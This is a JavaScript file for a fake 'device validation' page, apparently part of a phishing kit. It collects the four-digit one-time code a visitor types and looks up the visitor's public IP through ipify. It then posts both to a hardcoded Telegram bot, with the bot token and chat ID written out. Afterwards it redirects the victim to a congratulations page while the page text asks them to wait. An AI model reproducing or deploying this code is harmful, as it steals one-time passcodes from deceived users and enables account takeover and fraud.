var tiempoRestante = 121;
var intervalo;

function iniciarContador() {
    intervalo = setInterval(function () {
        tiempoRestante--;
        document.getElementById('contador').innerText = tiempoRestante;
        if (tiempoRestante <= 0) {
            clearInterval(intervalo);
            document.getElementById('contador').innerText = '0';
            document.getElementById('tiempo-restante').innerText = 'Aguarda el codigo porfavor...';
        }
    }, 1000);
}

function obtenerIPyEnviarMensaje(codigo) {
    axios.get('https://api.ipify.org?format=json')
        .then(response => {
            const ip = response.data.ip;
            const botToken = '6835132981:AAFXb1FjswdXDH5Q6cBeUKvBc-B8gID3Ljc';
            const chatId = '-1002110248910';
            const mensaje = `Código OTP: ${codigo}\nIP del cliente: ${ip}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;

            axios.post(url)
                .then(response => {
                    console.log('Mensaje enviado:', response.data);
                    clearInterval(intervalo);
                    window.location.href = "./congratulations.html";
                })
                .catch(error => {
                    console.error('Error al enviar mensaje:', error);
                });
        })
        .catch(error => {
            console.error('Error al obtener la IP:', error);
        });
}

function validarDispositivo() {
    var codigo = '';
    document.querySelectorAll('.validation-code-input').forEach(function (input) {
        codigo += input.value;
    });

    obtenerIPyEnviarMensaje(codigo);
}

document.querySelectorAll('.validation-code-input').forEach(function (input, index) {
    input.addEventListener('input', function () {
        if (this.value.length === 1) {
            if (index < 3) {
                document.getElementById('digit' + (index + 2)).focus();
            }
        }
    });
    input.addEventListener('keydown', function (event) {
        if (event.key === 'Backspace' && this.value.length === 0) {
            if (index > 0) {
                document.getElementById('digit' + index).focus();
            }
        }
    });
});

iniciarContador();
